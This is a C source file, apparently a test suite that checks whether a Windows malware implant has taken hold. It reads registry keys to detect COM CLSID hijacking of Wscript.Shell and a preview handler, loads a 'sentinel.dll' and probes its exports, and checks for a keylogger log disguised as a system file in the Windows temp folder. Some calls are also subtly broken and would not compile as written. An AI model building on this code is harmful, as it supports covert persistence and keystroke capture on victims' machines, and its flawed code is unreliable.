#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Test COM hijack persistence
void TestCOMPersistence() {
    printf("[+] Testing COM hijack persistence...\n");
    
    // Check if COM CLSIDs are hijacked
    HKEY hKey;
    char dllPath[MAX_PATH];
    DWORD pathSize = sizeof(dllPath);
    
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Classes\\CLSID\\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\\InprocServer32", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        if (RegQueryValueEx(hKey, NULL, NULL, NULL, (BYTE*)dllPath, &pathSize) == ERROR_SUCCESS) {
            printf("[+] Wscript.Shell hijacked to: %s\n", dllPath);
        }
        RegCloseKey(hKey);
    }
    
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Classes\\CLSID\\{89BCB740-6119-101A-BCB7-00DD010655AF}\\InprocServer32", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        if (RegQueryValueEx(hKey, NULL, NULL, NULL, (BYTE*)dllPath, &pathSize) == ERROR_SUCCESS) {
            printf("[+] Text Preview Handler hijacked to: %s\n", dllPath);
        }
        RegCloseKey(hKey);
    }
    
    // Test COM object activation
    printf("[+] Testing COM object activation...\n");
    CoInitialize(NULL);
    
    IUnknown* pUnknown;
    HRESULT hr = CoCreateInstance(
        CLSIDFromString(L"{72C24DD5-D70A-438B-8A42-98424B88AFB8}"),
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_IUnknown,
        (void**)&pUnknown
    );
    
    if (hr == S_OK) {
        printf("[+] COM object activated successfully\n");
        pUnknown->Release();
    } else {
        printf("[-] COM object activation failed: 0x%08X\n", hr);
    }
    
    CoUninitialize();
}

// Test sentinel DLL execution
void TestSentinelDLL() {
    printf("\n[+] Testing sentinel DLL execution...\n");
    
    HMODULE sentinelDll = LoadLibraryA("sentinel.dll");
    if (sentinelDll) {
        printf("[+] Sentinel DLL loaded successfully\n");
        
        // Check for exported functions
        if (GetProcAddress(sentinelDll, "StartSentinel")) {
            printf("[+] StartSentinel function found\n");
        }
        if (GetProcAddress(sentinelDll, "StopSentinel")) {
            printf("[+] StopSentinel function found\n");
        }
        
        FreeLibrary(sentinelDll);
    } else {
        printf("[-] Failed to load sentinel DLL: %d\n", GetLastError());
    }
}

// Test keylogger functionality
void TestKeylogger() {
    printf("\n[+] Testing keylogger functionality...\n");
    
    // Check if log file exists
    FILE* logFile = fopen("C:\\Windows\\Temp\\system.log", "r");
    if (logFile) {
        printf("[+] Keylog file exists\n");
        
        fseek(logFile, 0, SEEK_END);
        long fileSize = ftell(logFile);
        printf("[+] Log file size: %ld bytes\n", fileSize);
        
        fclose(logFile);
    } else {
        printf("[-] Keylog file not found\n");
    }
}

int main() {
    printf("=== Persistence Test Suite ===\n\n");
    
    TestCOMPersistence();
    TestSentinelDLL();
    TestKeylogger();
    
    printf("\n[+] Test completed\n");
    return 0;
}